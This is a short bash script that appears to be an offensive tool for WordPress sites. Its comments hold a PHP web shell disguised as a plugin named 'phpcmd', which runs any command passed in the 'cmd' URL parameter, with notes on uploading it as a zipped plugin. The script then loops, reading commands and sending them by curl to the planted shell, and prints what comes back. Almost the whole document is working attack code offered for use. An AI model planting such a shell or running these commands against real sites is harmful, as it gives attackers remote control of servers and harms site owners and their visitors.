#! /bin/bash
# --- PLUGIN CONTENT ---
#<?php
#  /*
#   * Plugin Name: phpcmd
#  */
#
#  echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';
#?>
# --- ---
# This is uploaded in a file('myplug.php') inside a zipfile('mp.zip').
# The corresponding plugin path should be:
# 'http://SITE/wp-contents/plugins/mp/myplug.php?cmd=COMMAND'

echo "Type 'exit' to exit."
#read -p "URL to WP site: " base_url
base_url="$1"
fill="/wp-content/plugins/"
read -p "Plugin path: $base_url$fill" plugin_url
#read -p "GET parameter to use: " get
get="cmd"

echo "Using URL: $base_url$fill$plugin_url?cmd=COMMAND"

while true
do
  read -p "Command-to-send: " cmd

  if [ "$cmd" = "exit" ]; then exit; fi

  curl -GSs \
  $base_url"/wp-content/plugins/"$plugin_url \
  --data-urlencode "$get=$cmd" \
  | html2text
done
